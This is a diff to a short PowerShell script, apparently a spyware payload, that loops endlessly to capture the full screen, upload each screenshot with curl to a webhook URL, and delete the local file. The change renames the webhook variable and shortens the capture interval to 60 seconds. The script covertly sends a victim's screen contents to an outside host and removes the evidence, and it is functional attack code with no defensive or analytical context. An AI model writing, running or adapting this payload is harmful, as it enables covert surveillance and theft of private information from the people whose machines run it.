@@ -1,8 +1,7 @@
 
 While ($true){
 
-# Replace your webhook here
-$dc = 'YOUR_WEBHOOK_HERE'
+$hookurl = "$dc"
 
 
 $Filett = "$env:temp\SC.png"
@@ -18,10 +17,10 @@ $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
 Start-Sleep 1
-curl.exe -F "file1=@$filett" $dc
+curl.exe -F "file1=@$filett" $hookurl
 Start-Sleep 1
 Remove-Item -Path $filett
 
 
-Start-Sleep 300 # change to whatever interval you would like beetween screenshots
+Start-Sleep 60 # change to whatever interval you would like beetween screenshots
 }
